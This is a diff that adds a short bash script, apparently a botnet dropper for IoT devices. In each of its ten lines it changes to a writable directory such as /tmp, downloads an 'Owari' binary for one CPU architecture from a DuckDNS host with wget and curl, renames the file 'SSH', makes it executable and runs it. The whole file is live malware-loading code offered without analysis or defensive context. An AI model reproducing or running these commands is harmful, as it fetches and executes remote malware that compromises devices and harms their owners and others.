@@ -1,0 +1,11 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://nixw00xtr00x.duckdns.org/Binarys/Owari.x86; curl -O http://nixw00xtr00x.duckdns.org/Binarys/Owari.x86;cat Owari.x86 >SSH;chmod +x *;./SSH X86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://nixw00xtr00x.duckdns.org/Binarys/Owari.mips; curl -O http://nixw00xtr00x.duckdns.org/Binarys/Owari.mips;cat Owari.mips >SSH;chmod +x *;./SSH MIPS
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://nixw00xtr00x.duckdns.org/Binarys/Owari.mpsl; curl -O http://nixw00xtr00x.duckdns.org/Binarys/Owari.mpsl;cat Owari.mpsl >SSH;chmod +x *;./SSH MPSL
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://nixw00xtr00x.duckdns.org/Binarys/Owari.arm4; curl -O http://nixw00xtr00x.duckdns.org/Binarys/Owari.arm4;cat Owari.arm4 >SSH;chmod +x *;./SSH ARM4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://nixw00xtr00x.duckdns.org/Binarys/Owari.arm5; curl -O http://nixw00xtr00x.duckdns.org/Binarys/Owari.arm5;cat Owari.arm5 >SSH;chmod +x *;./SSH ARM5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://nixw00xtr00x.duckdns.org/Binarys/Owari.arm6; curl -O http://nixw00xtr00x.duckdns.org/Binarys/Owari.arm6;cat Owari.arm6 >SSH;chmod +x *;./SSH ARM6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://nixw00xtr00x.duckdns.org/Binarys/Owari.arm7; curl -O http://nixw00xtr00x.duckdns.org/Binarys/Owari.arm7;cat Owari.arm7 >SSH;chmod +x *;./SSH ARM7
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://nixw00xtr00x.duckdns.org/Binarys/Owari.ppc; curl -O http://nixw00xtr00x.duckdns.org/Binarys/Owari.ppc;cat Owari.ppc >SSH;chmod +x *;./SSH PPC
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://nixw00xtr00x.duckdns.org/Binarys/Owari.m68k; curl -O http://nixw00xtr00x.duckdns.org/Binarys/Owari.m68k;cat Owari.m68k >SSH;chmod +x *;./SSH M86K
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://nixw00xtr00x.duckdns.org/Binarys/Owari.sh4; curl -O http://nixw00xtr00x.duckdns.org/Binarys/Owari.sh4;cat Owari.sh4 >SSH;chmod +x *;./SSH SH4
